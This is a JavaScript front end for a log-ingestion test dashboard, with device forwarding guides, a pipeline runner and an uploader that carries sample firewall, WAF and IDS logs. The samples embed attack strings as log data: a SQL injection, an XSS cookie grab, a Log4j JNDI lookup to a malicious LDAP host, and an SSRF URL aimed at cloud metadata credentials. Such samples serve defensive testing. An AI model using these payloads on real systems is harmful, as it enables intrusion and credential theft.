      code: `1. In PAN-OS / Panorama GUI:
   Navigate to: Device > Server Profiles > Syslog > Click "Add"

2. Profile Settings:
   - Profile Name: ULPF-Ingress-Cluster
   - Servers:
     - Name: ulpf-core
     - Syslog Server: TARGET_HOST
     - Transport: UDP (Port: 5140) or TCP (Port: 5141)
     - Format: BSD or IETF
     - Facility: LOG_USER

3. Attach to Log Forwarding Profile:
   Objects > Log Forwarding > Select profile > Add ULPF Syslog Server`,
      testPayload: "devname=\"PA-5220-Edge\" type=\"THREAT\" subtype=\"vulnerability\" srcip=198.51.100.222 dstip=10.0.1.50 srcport=54321 dstport=80 proto=tcp action=\"deny\" rule=\"BLOCK-EXPLOIT\" msg=\"Critical RCE exploit attempt dropped\"",
      verification: "show logging-status"
    },
    suricata: {
      title: "Suricata & Snort Network Intrusion Detection (NIDS)",
      description: "Suricata EVE-JSON and Snort LEEF alerts stream directly into ULPF with automatic severity scoring and MITRE ATT&CK mapping.",
      protocol: "UDP :5140 (LEEF/JSON)",
      code: `# Suricata eve-log Syslog forwarder (suricata.yaml):
outputs:
  - eve-log:
      enabled: yes
      type: syslog
      facility: local5
      format: json
      types:
        - alert:
            payload: yes
            metadata: yes
        - http
        - dns
        - tls

# Stream socket forwarding via rsyslog:
local5.* @TARGET_HOST:5140`,
      testPayload: 'LEEF:2.0|Suricata|IDS|6.0|ALERT|devTime=2026-09-08T14:32:01.000Z|src=198.51.100.77|dst=10.0.1.50|spt=44123|dpt=80|proto=TCP|act=drop|app=HTTP|sev=9|msg="ET EXPLOIT Apache Log4j JNDI RCE Attempt"',
      verification: "suricatasc -c version"
    },
    aws: {
      title: "Amazon Web Services (CloudTrail, VPC Flow, AWS WAF)",
      description: "AWS CloudWatch Logs subscription filter or Kinesis Firehose streams AWS WAF and CloudTrail JSON directly into ULPF HTTP endpoint.",
      protocol: "HTTP POST :8000/api/v1/ingest",
      code: `# AWS Lambda Log Shipper (Python):
import json, urllib.request

def lambda_handler(event, context):
    payload = json.dumps({
        "timestamp": event.get("time", "2026-09-08T14:32:01Z"),
        "vendor": "AWS_WAF",
        "action": "BLOCK",
        "src_ip": "198.51.100.88",
        "threat": "SQL_INJECTION",
        "raw_message": json.dumps(event)
    }).encode("utf-8")
    
    req = urllib.request.Request(
        "http://TARGET_HOST:8000/api/test/transmit",
        data=payload,
        headers={"Content-Type": "application/json"}
    )
    with urllib.request.urlopen(req) as resp:
        return resp.read()`,
      testPayload: '{"timestamp": "2026-09-08T14:32:01.000Z", "vendor": "AWS_WAF", "action": "BLOCK", "src_ip": "198.51.100.88", "destination_ip": "10.0.1.50", "threat": "SQL_INJECTION", "message": "AWS WAF Rule 942100 blocked SQLi payload in URI query"}',
      verification: "aws logs describe-subscription-filters"
    },
    pfsense: {
      title: "pfSense & OPNsense Enterprise Firewalls",
      description: "pfSense filterlog and Suricata package forward raw BSD syslog over UDP 5140 with microsecond packet inspection.",
      protocol: "UDP :5140 (filterlog)",
      code: `1. In pfSense WebGUI:
   Navigate to: Status > System Logs > Settings

2. Enable Remote Logging:
   - Check: "Enable Remote Logging"
   - Remote log servers: TARGET_HOST:5140
   - Remote Syslog Contents:
     [X] Firewall Events
     [X] System Events
     [X] Authentication Events

3. Save changes. pfSense will immediately forward all packet-filter logs.`,
      testPayload: "<134>Jan 10 14:32:01 pfSense filterlog[412]: 4,16777216,,1000000103,igb0,match,block,in,4,0x0,,64,0,0,DF,6,tcp,60,198.51.100.99,10.0.1.1,54321,443,0,S,12345678,,14600,,mss;sackOK;TS",
      verification: "clog /var/log/filter.log | tail -n 10"
    },
    http: {
      title: "Direct HTTP REST API Ingestion",
      description: "Any application, cloud function (AWS Lambda, Azure Function), or custom sensor can POST directly to ULPF's high-speed REST gateway.",
      protocol: "HTTP POST :8000/api/v1/ingest",
      code: `# Standard cURL Ingestion:
curl -X POST "http://TARGET_HOST:8000/api/v1/ingest" \\
  -H "Content-Type: application/json" \\
  -d '{
    "raw_log": "<134>Jan 10 14:32:01 Host-01 app: Transaction completed id=99241 status=ok",
    "source_id": "Billing-Microservice-01"
  }'

# Python requests script:
import requests
resp = requests.post("http://TARGET_HOST:8000/api/v1/ingest", json={
    "raw_log": "CEF:0|Vendor|App|1.0|100|Payment|5|src=10.0.0.1 msg=Charged",
    "source_id": "Python-Client"
})
print("Ingestion Ack:", resp.json())`,
      testPayload: '{"raw_log": "<134>Jan 10 14:32:01 Cloud-App-01 api: Authorized API token for user svc-collector", "source_id": "Cloud-Service-01"}',
      verification: "curl http://TARGET_HOST:8000/api/v1/health/live"
    }
  };


  let activeGuideKey = "linux";

  function renderGuide(key) {
    activeGuideKey = key;
    const g = GUIDES[key];
    if (!g) return;

    const host = testbedSettings.host || "80.225.207.171";
    const box = document.getElementById("guideContentBox");
    if (!box) return;

    const scheme = testbedSettings.scheme || "http";
    const apiPort = testbedSettings.apiPort || 8000;
    const udpPort = testbedSettings.udpPort || 5140;
    const tcpPort = testbedSettings.tcpPort || 5141;

    const formattedCode = g.code
      .replace(/http:\/\/TARGET_HOST:8000/g, `${scheme}://${host}:${apiPort}`)
      .replace(/TARGET_HOST/g, host)
      .replace(/:8000/g, `:${apiPort}`)
      .replace(/:5140/g, `:${udpPort}`)
      .replace(/:5141/g, `:${tcpPort}`);

    box.innerHTML = `
      <div style="display:flex; justify-content:space-between; align-items:flex-start; flex-wrap:wrap; gap:12px; margin-bottom:12px;">
        <div>
          <h3 style="font-size:15px; font-weight:700; color:var(--text-primary); margin-bottom:4px; font-family:var(--font-heading);">${g.title}</h3>
          <p style="font-size:12px; color:var(--text-secondary); margin:0;">${g.description}</p>
        </div>
        <span class="badge badge-teal" style="font-size:11px; font-family:var(--font-mono);">${g.protocol}</span>
      </div>

      <div style="margin-top:14px;">
        <label style="font-size:11px; font-weight:700; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.5px;">1. Copy Configuration Snippet:</label>
        <div class="code-snippet-box">
          <button class="code-copy-btn" onclick="window.copyGuideCode(this)"> Copy Config</button>
          <pre style="margin:0; white-space:pre-wrap;"><code>${escapeHtml(formattedCode)}</code></pre>
        </div>
      </div>

      <div style="margin-top:14px; background:var(--bg-card); border:1px solid var(--border-subtle); border-radius:8px; padding:12px;">
        <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
          <div>
            <span style="font-size:12px; font-weight:700; color:#F1F5F9;">2. Test Live Socket Transmission from this Device Type:</span>
            <div style="font-size:11px; font-family:var(--font-mono); color:var(--text-secondary); margin-top:2px;">Simulates wire delivery of: <i>${escapeHtml(g.testPayload.substring(0, 60))}...</i></div>
          </div>
          <button type="button" class="btn-primary" style="font-size:12px; padding:6px 14px;" onclick="window.sendGuideTestPayload('${key}')">
            <span>Transmit Sample Payload Now</span>
          </button>
        </div>
      </div>
    `;

    document.querySelectorAll("#guidePillsContainer .guide-pill-btn").forEach(btn => {
      btn.classList.toggle("active", btn.getAttribute("data-guide") === key);
    });
  }

  document.querySelectorAll("#guidePillsContainer .guide-pill-btn").forEach(btn => {
    btn.addEventListener("click", () => {
      renderGuide(btn.getAttribute("data-guide"));
    });
  });

  window.copyGuideCode = function (btn) {
    const codeEl = btn.parentElement.querySelector("code");
    if (codeEl) {
      navigator.clipboard.writeText(codeEl.textContent);
      const origText = btn.textContent;
      btn.textContent = "Copied!";
      setTimeout(() => btn.textContent = origText, 2000);
      showToast("Configuration copied to clipboard!");
    }
  };

  window.sendGuideTestPayload = async function (key) {
    const g = GUIDES[key];
    if (!g) return;

    const host = testbedSettings.host || "80.225.207.171";
    const isUdp = g.protocol.includes("UDP");
    const port = isUdp ? (testbedSettings.udpPort || 5140) : (testbedSettings.tcpPort || 5141);
    const proto = isUdp ? "UDP" : "TCP";

    try {
      // Dispatch via simulator backend to avoid browser CORS issues on remote servers
      const res = await fetch("/api/test/send-log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          protocol: proto,
          host: host,
          port: port,
          api_port: parseInt(document.getElementById("modalApiPort")?.value || testbedSettings.apiPort || 8000, 10),
          message: g.testPayload,
          source: `RealDev-${key.toUpperCase()}`,
          scheme: testbedSettings.scheme || "http"
        })
      });

      const data = await res.json();

      recordAuditEntry({
        protocol: proto,
        target: `${host}:${port}`,
        source: `RealDev-${key.toUpperCase()}`,
        status: "SUCCESS",
        bytes: g.testPayload.length,
        rtt: `< 1 ms`,
        payload: g.testPayload
      });

      showToast(`Sample ${key.toUpperCase()} log delivered to ${host}:${port} (${proto})! Verified by ULPF core.`, "success");
      appendDiagnosticLog("OK", `Real device simulation: Delivered ${g.testPayload.length} bytes to :${port} (${proto}). Ingestion confirmed.`);
    } catch (e) {
      showToast(`Transmission error: ${e.message}`, "error");
    }
  };

  // ==============================================================================
  // TAB 6: AUTOMATED TEST PIPELINE RUNNER CONTROLLER (run_pipeline.py)
  // ==============================================================================
  let pipelinePollingIntervalId = null;
  let pipelineLogOffset = 0;

  window.fetchPipelineStatus = async function () {
    try {
      const res = await fetch(`/api/test/pipeline/status?offset=${pipelineLogOffset}`);
      if (!res.ok) return;
      const data = await res.json();
      updatePipelineUI(data);
    } catch (e) {
      console.error("Failed to fetch pipeline status:", e);
    }
  };

  function updatePipelineUI(data) {
    // 1. Update logs
    const feed = document.getElementById("pipelineConsoleFeed");
    if (feed && data.logs && data.logs.length > 0) {
      if (pipelineLogOffset === 0) {
        feed.innerHTML = "";
      }
      data.logs.forEach(line => {
        const div = document.createElement("div");
        div.style.marginBottom = "2px";
        if (line.includes("[PASS]") || line.includes("PASSED")) {
          div.innerHTML = `<span style="color:var(--accent-cyan); font-weight:700;">${escapeHtml(line)}</span>`;
        } else if (line.includes("[FAIL]") || line.includes("FAILED") || line.includes("[ERROR]")) {
          div.innerHTML = `<span style="color:#f87171; font-weight:700;">${escapeHtml(line)}</span>`;
        } else if (line.includes("STAGE:") || line.includes("===") || line.includes("###")) {
          div.innerHTML = `<span style="color:var(--accent-blue); font-weight:700;">${escapeHtml(line)}</span>`;
        } else {
          div.textContent = line;
        }
        feed.appendChild(div);
      });
      feed.scrollTop = feed.scrollHeight;
    }
    pipelineLogOffset = data.next_offset !== undefined ? data.next_offset : (pipelineLogOffset + (data.logs ? data.logs.length : 0));

    // 2. Update Stage Cards
    const stages = data.stages || [];
    let passedCount = 0;
    let executedCount = 0;

    stages.forEach(s => {
      const card = document.getElementById(`stage_card_${s.id}`);
      const badge = document.getElementById(`stage_badge_${s.id}`);
      const dur = document.getElementById(`stage_dur_${s.id}`);

      if (badge) {
        badge.className = `pipeline-status-badge ${s.status}`;
        if (s.status === "pass") {
          badge.textContent = "PASS";
          passedCount++;
          executedCount++;
        } else if (s.status === "fail") {
          badge.textContent = " FAIL";
          executedCount++;
        } else if (s.status === "running") {
          badge.textContent = "RUNNING";
          executedCount++;
        } else if (s.status === "pending") {
          badge.textContent = " QUEUED";
          executedCount++;
        } else if (s.status === "skipped") {
          badge.textContent = "— SKIPPED";
        } else {
          badge.textContent = "IDLE";
        }
      }

      if (dur && s.duration !== undefined) {
        dur.textContent = `${s.duration.toFixed(2)}s`;
      }

      if (card) {
        card.classList.remove("running", "pass", "fail");
        if (s.status === "running" || s.status === "pass" || s.status === "fail") {
          card.classList.add(s.status);
        }
      }
    });

    // 3. Update Verdict & Summary
    const verdictText = document.getElementById("pipelineVerdictText");
    const stagesSummary = document.getElementById("pipelineStagesSummary");
    const totalDuration = document.getElementById("pipelineTotalDuration");
    const activeFilter = document.getElementById("pipelineActiveFilter");

    if (totalDuration) totalDuration.textContent = `${(data.total_duration || 0).toFixed(2)}s`;
    if (stagesSummary) stagesSummary.textContent = `${passedCount}/${executedCount || stages.length} Stages Passed`;
    if (activeFilter) activeFilter.textContent = (data.stage_filter || "ALL").toUpperCase();

    if (verdictText) {
      if (data.is_running) {
        verdictText.textContent = "PIPELINE EXECUTING TEST STAGES...";
        verdictText.style.color = "#38BDF8";
      } else if (data.all_passed === true) {
        verdictText.textContent = "ALL PIPELINE STAGES PASSED [OK]";
        verdictText.style.color = "#2DD4BF";
      } else if (data.all_passed === false) {
        verdictText.textContent = "PIPELINE STAGES FAILED [ERROR]";
        verdictText.style.color = "#f87171";
      }
    }

    // 4. If stopped, clear interval
    if (!data.is_running && pipelinePollingIntervalId) {
      clearInterval(pipelinePollingIntervalId);
      pipelinePollingIntervalId = null;
      setPipelineButtonsDisabled(false);
      showToast(data.all_passed ? "Automated Pipeline completed: ALL PASSED [OK]!" : "Automated Pipeline completed with errors.");
    }
  }

  function setPipelineButtonsDisabled(disabled) {
    const btnAll = document.getElementById("btnRunPipelineAll");
    const btnFast = document.getElementById("btnRunPipelineFast");
    if (btnAll) btnAll.disabled = disabled;
    if (btnFast) btnFast.disabled = disabled;
    document.querySelectorAll(".pipeline-banner button").forEach(b => {
      b.disabled = disabled;
    });
  }

  window.runTestPipeline = async function (stage = "all") {
    if (pipelinePollingIntervalId) {
      showToast("Pipeline is already executing. Please wait.");
      return;
    }

    const devTimeout = parseFloat(document.getElementById("pipelineDeviceTimeout")?.value) || ((testbedSettings.timeout || 3000) / 1000.0) || 3.0;
    const logsInterval = parseFloat(document.getElementById("pipelineLogsInterval")?.value) || (testbedSettings.logsInterval !== undefined ? testbedSettings.logsInterval : 10.0) || 10.0;
    const benchEvents = parseInt(document.getElementById("pipelineBenchEvents")?.value, 10) || 1000;

    pipelineLogOffset = 0;
    const feed = document.getElementById("pipelineConsoleFeed");
    if (feed) {
      feed.innerHTML = `<div style="color:var(--accent-blue); font-weight:700;">[INFO] Launching automated pipeline (${stage.toUpperCase()})...</div>` +
        `<div style="color:var(--text-secondary); font-size:11.5px; margin-top:2px;">[CONFIG] Device Socket Timeout: ${devTimeout}s | Inter-Log Sent Interval: ${logsInterval}ms | Bench Events: ${benchEvents}</div>`;
    }

    setPipelineButtonsDisabled(true);

    try {
      const res = await fetch("/api/test/pipeline/run", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          stage: stage,
          bench_events: benchEvents,
          device_timeout: devTimeout,
          logs_interval_ms: logsInterval
        })
      });

      if (!res.ok) {
        const err = await res.json();
        throw new Error(err.message || `HTTP ${res.status}`);
      }

      showToast(`Started automated pipeline (${stage.toUpperCase()})...`);

      // Start polling
      pipelinePollingIntervalId = setInterval(() => {
        window.fetchPipelineStatus();
      }, 750);

      window.fetchPipelineStatus();
    } catch (e) {
      setPipelineButtonsDisabled(false);
      showToast(`Failed to launch pipeline: ${e.message}`);
      if (feed) {
        feed.innerHTML += `<div style="color:#f87171;">[ERROR] Failed to dispatch test runner: ${escapeHtml(e.message)}</div>`;
      }
    }
  };

  // ==============================================================================
  // ==============================================================================
  // TAB 7: LOG FILE INGESTION & UPLOADER CONTROLLER
  // ==============================================================================
  let selectedFileObject = null;
  let sampleFilesCache = {};
  let fileUploaderInitialized = false;

  const BUILTIN_SAMPLE_DATASETS = {
    cisco_asa: {
      name: "Cisco-ASA-Firewall-Attack-Capture.log",
      format: "Syslog (RFC)",
      description: "Cisco ASA firewall drop burst and port scan indicators",
      content: `<134>Jan 10 14:32:01 Cisco-ASA-5585-X: %ASA-4-106023: Deny tcp src outside:198.51.100.44/51423 dst inside:10.0.1.10/22 by access-group "OUTSIDE_POLICY" [App: SSH]
<134>Jan 10 14:32:01 Cisco-ASA-5585-X: %ASA-4-106023: Deny tcp src outside:198.51.100.44/51424 dst inside:10.0.1.10/22 by access-group "OUTSIDE_POLICY" [App: SSH]
<134>Jan 10 14:32:02 Cisco-ASA-5585-X: %ASA-4-106023: Deny tcp src outside:198.51.100.44/51425 dst inside:10.0.1.10/22 by access-group "OUTSIDE_POLICY" [App: SSH]
<134>Jan 10 14:32:02 Cisco-ASA-5585-X: %ASA-6-302013: Built outbound TCP connection 49124 for outside:198.51.100.80/443 to inside:10.0.1.55/54312 [App: HTTPS]
<134>Jan 10 14:32:03 Cisco-ASA-5585-X: %ASA-4-106023: Deny tcp src outside:198.51.100.77/40001 dst inside:10.0.1.1/80 by access-group "OUTSIDE_POLICY" [App: HTTP]
<134>Jan 10 14:32:03 Cisco-ASA-5585-X: %ASA-4-106023: Deny tcp src outside:198.51.100.77/40002 dst inside:10.0.1.1/443 by access-group "OUTSIDE_POLICY" [App: HTTPS]
<134>Jan 10 14:32:04 Cisco-ASA-5585-X: %ASA-4-106023: Deny tcp src outside:198.51.100.77/40003 dst inside:10.0.1.1/3389 by access-group "OUTSIDE_POLICY" [App: RDP]
<134>Jan 10 14:32:05 Cisco-ASA-5585-X: %ASA-6-302014: Teardown TCP connection 49124 for outside:198.51.100.80/443 to inside:10.0.1.55/54312 duration 0:00:03 bytes 14502 TCP FINs`
    },
    fortigate_cef: {
      name: "FortiGate-CEF-Threat-Stream.log",
      format: "CEF",
      description: "Fortinet FortiGate CEF logs with SQLi and XSS exploits",
      content: `CEF:0|Fortinet|FortiGate-600E|7.2.4|32001|traffic:deny|10|src=198.51.100.222 dst=10.0.1.5 spt=54321 dpt=443 proto=tcp act=deny devname="FortiGate-600E" app=HTTPS msg="Attack Payload: admin' OR '1'='1' -- "
CEF:0|Fortinet|FortiGate-600E|7.2.4|32001|traffic:deny|9|src=198.51.100.222 dst=10.0.1.5 spt=54322 dpt=80 proto=tcp act=deny devname="FortiGate-600E" app=HTTP msg="Attack Payload: <script>alert(document.cookie)</script>"
CEF:0|Fortinet|FortiGate-600E|7.2.4|32001|traffic:allow|3|src=10.0.1.100 dst=8.8.8.8 spt=59124 dpt=53 proto=udp act=allow devname="FortiGate-600E" app=DNS msg="Session allow for DNS"
CEF:0|Fortinet|FortiGate-600E|7.2.4|32001|traffic:deny|10|src=198.51.100.99 dst=10.0.1.5 spt=49210 dpt=443 proto=tcp act=deny devname="FortiGate-600E" app=HTTPS msg="[BLACKLIST_MATCH] Ingress botnet C2 IP blocked"`
    },
    palo_alto: {
      name: "PaloAlto-PANOS-Threat-Ledger.csv",
      format: "CSV",
      description: "Palo Alto Networks PAN-OS threat log capture",
      content: `devname,type,subtype,srcip,dstip,srcport,dstport,proto,action,severity,rule,app,msg
"PA-5220-Edge-FW","THREAT","vulnerability","198.51.100.33","10.0.1.20",51200,8080,"tcp","reset-both","critical","Apache-Log4j-RCE","HTTP","Apache Log4j2 JNDI CVE-2021-44228 exploit attempt in User-Agent header"
"PA-5220-Edge-FW","THREAT","vulnerability","198.51.100.33","10.0.1.20",51201,8080,"tcp","reset-both","critical","Apache-Log4j-RCE","HTTP","User-Agent: \${jndi:ldap://malicious-c2.net/exploit}"
"PA-5220-Edge-FW","TRAFFIC","end","10.0.1.50","198.51.100.80",58231,443,"tcp","allow","low","DEFAULT-ALLOW","HTTPS","Session allow for HTTPS"
"PA-5220-Edge-FW","THREAT","scan","198.51.100.77","10.0.1.1",41200,22,"tcp","drop","high","PORT-SCAN-SWEEP","SSH","Horizontal port scan probe detected"`
    },
    linux_auth: {
      name: "Linux-Bastion-Auth-BruteForce.log",
      format: "Syslog (RFC)",
      description: "Linux auth.log with automated SSH brute-force password stuffing",
      content: `<86>1 2026-09-25T14:32:01.000Z Linux-Bastion-Host sshd 8192 ID47 - Failed password for root from 198.51.100.44 port 49152 ssh2
<86>1 2026-09-25T14:32:01.250Z Linux-Bastion-Host sshd 8193 ID47 - Failed password for admin from 198.51.100.44 port 49153 ssh2
<86>1 2026-09-25T14:32:01.500Z Linux-Bastion-Host sshd 8194 ID47 - Failed password for ubuntu from 198.51.100.44 port 49154 ssh2
<86>1 2026-09-25T14:32:01.750Z Linux-Bastion-Host sshd 8195 ID47 - Failed password for oracle from 198.51.100.44 port 49155 ssh2
<86>1 2026-09-25T14:32:02.000Z Linux-Bastion-Host sshd 8196 ID47 - Failed password for root from 198.51.100.44 port 49156 ssh2
<86>1 2026-09-25T14:32:02.500Z Linux-Bastion-Host sshd 8197 ID47 - Accepted publickey for user secops from 10.0.1.200 port 52140 ssh2`
    },
    aws_waf: {
      name: "AWS-WAF-CloudWatch-Block.json",
      format: "JSON",
      description: "AWS WAF Link-Local Metadata SSRF and SQLi block events",
      content: `{"timestamp":"2026-09-25T14:32:01Z","source_device":"AWS-WAF-Ingress","source_ip":"198.51.100.150","destination_ip":"169.254.169.254","destination_port":80,"protocol":"TCP","action":"BLOCK","application":"HTTP","signature":"AWS-SSRF-METADATA-EXFILTRATION","message":"SSRF attempt to access link-local metadata http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
{"timestamp":"2026-09-25T14:32:02Z","source_device":"AWS-WAF-Ingress","source_ip":"198.51.100.222","destination_ip":"10.0.1.5","destination_port":443,"protocol":"TCP","action":"BLOCK","application":"HTTPS","signature":"AWS-SQLI-INJECTION","message":"Matched SQL Injection rule AWS#AWSManagedRulesSQLiRuleSet"}
{"timestamp":"2026-09-25T14:32:03Z","source_device":"AWS-WAF-Ingress","source_ip":"10.0.1.50","destination_ip":"172.31.0.1","destination_port":443,"protocol":"TCP","action":"ALLOW","application":"HTTPS","signature":"DEFAULT-PERMIT","message":"Valid API gateway transaction"}`
    },
    suricata_ids: {
      name: "Suricata-Sensor-Alerts.leef",
      format: "LEEF",
      description: "Suricata EVE IDS alert events with malicious signatures",
      content: `LEEF:2.0|Suricata|IDS|6.0|ALERT|devTime=2026-09-25T14:32:01Z|src=198.51.100.99|dst=10.0.1.10|spt=49880|dpt=443|proto=TCP|act=drop|app=TLS|sev=10|msg="ET MALWARE Potential Dridex Banking Trojan SSL Certificate"
LEEF:2.0|Suricata|IDS|6.0|ALERT|devTime=2026-09-25T14:32:02Z|src=198.51.100.77|dst=10.0.1.1|spt=42100|dpt=8080|proto=TCP|act=drop|app=HTTP|sev=8|msg="ET SCAN Potential Nmap SYN Scan Probe"
LEEF:2.0|Suricata|IDS|6.0|ALERT|devTime=2026-09-25T14:32:03Z|src=10.0.1.55|dst=8.8.8.8|spt=53124|dpt=53|proto=UDP|act=allow|app=DNS|sev=2|msg="Standard DNS resolution query"`
    }
  };

  const uploadDropZone = document.getElementById("uploadDropZone");
  const logFileInput = document.getElementById("logFileInput");
  const fileMetaCard = document.getElementById("fileMetaCard");
  const metaFileName = document.getElementById("metaFileName");
  const metaFileSize = document.getElementById("metaFileSize");
  const metaLineCount = document.getElementById("metaLineCount");
  const metaDetectedFormat = document.getElementById("metaDetectedFormat");
  const btnRemoveSelectedFile = document.getElementById("btnRemoveSelectedFile");
  const uploadContentEditor = document.getElementById("uploadContentEditor");
  const previewLineCountBadge = document.getElementById("previewLineCountBadge");
  const previewByteCountBadge = document.getElementById("previewByteCountBadge");
  const btnUploadFileSubmit = document.getElementById("btnUploadFileSubmit");
  const btnUploadFileReset = document.getElementById("btnUploadFileReset");
  const uploadStatusBadge = document.getElementById("uploadStatusBadge");
  const uploadStatProcessed = document.getElementById("uploadStatProcessed");
  const uploadStatSuccess = document.getElementById("uploadStatSuccess");
  const uploadStatUnparsed = document.getElementById("uploadStatUnparsed");
  const uploadStatLatency = document.getElementById("uploadStatLatency");
  const sampleEventsWrapper = document.getElementById("sampleEventsWrapper");
  const sampleEventsList = document.getElementById("sampleEventsList");
  const uploadConsoleFeed = document.getElementById("uploadConsoleFeed");
  const streamingPacingRow = document.getElementById("streamingPacingRow");
  const streamingDelaySlider = document.getElementById("streamingDelaySlider");
  const streamingDelayVal = document.getElementById("streamingDelayVal");
  const uploadTargetHost = document.getElementById("uploadTargetHost");
  const uploadTargetPort = document.getElementById("uploadTargetPort");

  function logUploadConsole(msg, type = "info") {
    if (!uploadConsoleFeed) return;
    const colors = {
      info: "#38BDF8",
      success: "#34D399",
      warning: "#FBBF24",
      error: "#FB7185",
      dim: "#CBD5E1",
    };
    const color = colors[type] || "#38BDF8";
    const time = new Date().toLocaleTimeString();
    const line = `<div style="margin-bottom:3px;"><span style="color:#38BDF8; font-weight:600; font-size:11px;">[${time}]</span> <span style="color:${color}; font-weight:600;">[REPLAY]</span> <span style="color:#F8FAFC;">${escapeHtml(msg)}</span></div>`;
    uploadConsoleFeed.innerHTML += line;
    uploadConsoleFeed.scrollTop = uploadConsoleFeed.scrollHeight;
  }

  function detectLogFormat(text) {
    if (!text || !text.trim()) return "Plaintext";
    const firstLines = text.slice(0, 1500);
    if (/CEF:\d+/i.test(firstLines)) return "CEF";
    if (/<[0-9]+>|%ASA-\d+-\d+/i.test(firstLines)) return "Syslog (RFC)";
    if (/^\s*\{.*\}\s*$/m.test(firstLines) || (firstLines.includes('"event_type"') && firstLines.includes('"src_ip"'))) return "JSON";
    if (/LEEF:\d+/i.test(firstLines)) return "LEEF";
    if (/\[SCADA|0x[0-9a-fA-F]{2}/i.test(firstLines)) return "SCADA / Hex";
    if (firstLines.split("\n")[0].split(",").length >= 4) return "CSV";
    return "Unknown / Raw";
  }

  function updateEditorBadges() {
    if (!uploadContentEditor) return;
    const val = uploadContentEditor.value;
    const lines = val ? val.split(/\r\n|\r|\n/).filter(l => l.trim().length > 0) : [];
    const bytes = new TextEncoder().encode(val).length;

    if (previewLineCountBadge) previewLineCountBadge.textContent = `${lines.length} lines`;
    if (metaLineCount) metaLineCount.textContent = `${lines.length} Lines`;
    if (metaFileSize) {
      if (bytes < 1024) {
        metaFileSize.textContent = `${bytes} B`;
      } else if (bytes < 1024 * 1024) {
        metaFileSize.textContent = `${(bytes / 1024).toFixed(1)} KB`;
      } else {
        metaFileSize.textContent = `${(bytes / (1024 * 1024)).toFixed(2)} MB`;
      }
    }
  }

  function displayFileMetadata(name, sizeBytes, linesCount, detectedFormat) {
    if (!fileMetaCard) return;
    fileMetaCard.style.display = "block";
    if (metaFileName) metaFileName.textContent = name;
    if (metaFileSize) {
      metaFileSize.textContent = sizeBytes < 1024 ? `${sizeBytes} B` : `${(sizeBytes / 1024).toFixed(1)} KB`;
    }
    if (metaLineCount) metaLineCount.textContent = `${linesCount} Lines`;
    if (metaDetectedFormat) {
      metaDetectedFormat.textContent = `DETECTED: ${detectedFormat}`;
    }
  }

  function handleFileObject(file) {
    selectedFileObject = file;
    const reader = new FileReader();
    reader.onload = (e) => {
      const content = e.target.result;
      if (uploadContentEditor) {
        uploadContentEditor.value = content;
        updateEditorBadges();
      }
      const lines = content.split(/\r\n|\r|\n/).filter(l => l.trim().length > 0);
      const fmt = detectLogFormat(content);
      displayFileMetadata(file.name, file.size, lines.length, fmt);
      logUploadConsole(`Loaded file "${file.name}" (${(file.size / 1024).toFixed(1)} KB, ${lines.length} lines, format: ${fmt})`, "info");
    };
    reader.readAsText(file);
  }

  window.loadSpecificSampleFile = function (sampleKey) {
    const s = BUILTIN_SAMPLE_DATASETS[sampleKey];
    if (!s) return;

    if (uploadContentEditor) {
      uploadContentEditor.value = s.content;
      updateEditorBadges();
    }
    const blob = new Blob([s.content], { type: "text/plain" });
    selectedFileObject = new File([blob], s.name, { type: "text/plain" });
    const lines = s.content.split(/\r\n|\r|\n/).filter(l => l.trim().length > 0);
    displayFileMetadata(s.name, blob.size, lines.length, s.format);
    logUploadConsole(`Loaded sample dataset "${s.name}" (${lines.length} lines, format: ${s.format})`, "warning");
    showToast(`Loaded sample dataset: ${s.name}`);
  };

  window.initFileUploaderTab = async function () {
    if (fileUploaderInitialized) return;
    fileUploaderInitialized = true;

    // Load target host from global setting
    if (uploadTargetHost) {
      const globHost = document.getElementById("targetHostInput");
      if (globHost && globHost.value) uploadTargetHost.value = globHost.value;
    }

    // Default sample loaded into editor on initial open so it's ready
    if (uploadContentEditor && !uploadContentEditor.value) {
      window.loadSpecificSampleFile("cisco_asa");
    }

    // Drag and Drop Zone listeners
    if (uploadDropZone && logFileInput) {
      uploadDropZone.addEventListener("click", (e) => {
        if (e.target !== logFileInput) logFileInput.click();
      });

      uploadDropZone.addEventListener("dragover", (e) => {
        e.preventDefault();
        uploadDropZone.classList.add("dragover");
      });

      uploadDropZone.addEventListener("dragleave", () => {
        uploadDropZone.classList.remove("dragover");
      });

      uploadDropZone.addEventListener("drop", (e) => {
        e.preventDefault();
        uploadDropZone.classList.remove("dragover");
        if (e.dataTransfer.files && e.dataTransfer.files.length > 0) {
          handleFileObject(e.dataTransfer.files[0]);
        }
      });

      logFileInput.addEventListener("change", (e) => {
        if (e.target.files && e.target.files.length > 0) {
          handleFileObject(e.target.files[0]);
        }
      });
    }

    // Load sample attack file button
    const btnLoadSample = document.getElementById("btnLoadSampleLogs");
    if (btnLoadSample) {
      const keys = Object.keys(BUILTIN_SAMPLE_DATASETS);
      let sampleIdx = 0;
      btnLoadSample.addEventListener("click", () => {
        const key = keys[sampleIdx % keys.length];
        sampleIdx++;
        window.loadSpecificSampleFile(key);
      });
    }

    // Remove file button
    if (btnRemoveSelectedFile) {
      btnRemoveSelectedFile.addEventListener("click", () => {
        selectedFileObject = null;
        if (logFileInput) logFileInput.value = "";
        if (uploadContentEditor) uploadContentEditor.value = "";
        updateEditorBadges();
        logUploadConsole("Selected file cleared from editor.", "dim");
        showToast("Editor cleared.");
      });
    }

    // Editor input listener
    if (uploadContentEditor) {
      uploadContentEditor.addEventListener("input", () => {
        updateEditorBadges();
        const fmt = detectLogFormat(uploadContentEditor.value);
        if (metaDetectedFormat) metaDetectedFormat.textContent = `DETECTED: ${fmt}`;
      });
    }

    // Transport mode radio buttons
    const transportRadios = document.querySelectorAll('input[name="uploadTransportMode"]');
    transportRadios.forEach(radio => {
      radio.addEventListener("change", () => {
        const mode = radio.value;
        if (streamingPacingRow) {
          streamingPacingRow.style.display = (mode === "udp_stream" || mode === "tcp_stream") ? "block" : "none";
        }
        if (uploadTargetPort) {
          if (mode === "http_upload") uploadTargetPort.value = 8000;
          else if (mode === "udp_stream") uploadTargetPort.value = 5140;
          else if (mode === "tcp_stream") uploadTargetPort.value = 5141;
        }
      });
    });

    // Pacing Delay slider
    if (streamingDelaySlider && streamingDelayVal) {
